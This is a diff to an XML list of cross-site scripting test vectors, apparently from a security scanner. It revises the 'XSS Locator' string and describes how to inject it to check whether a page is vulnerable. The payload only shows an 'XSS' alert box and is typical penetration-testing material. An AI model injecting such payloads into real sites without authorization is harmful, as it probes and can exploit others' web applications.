@@ -2,7 +2,7 @@
 <xss>
 	<attack>
 		<name>XSS Locator</name>
-		<code>&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//&gt;&lt;/SCRIPT&gt;!--&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}</code>
+		<code>&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}</code>
 
 		<desc>Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word &quot;XSS&quot; will pop up.  You&apos;ll need to replace the &quot;&amp;&quot; with &quot;%26&quot; if you are submitting this XSS string via HTTP GET or it will be ignored and everything after it will be interpreted as another variable.  Tip: If you&apos;re in a rush and need to quickly check a page, often times injecting the deprecated &quot;&lt;PLAINTEXT&gt;&quot; tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably.</desc>
 		<label>Basic XSS Attacks</label>
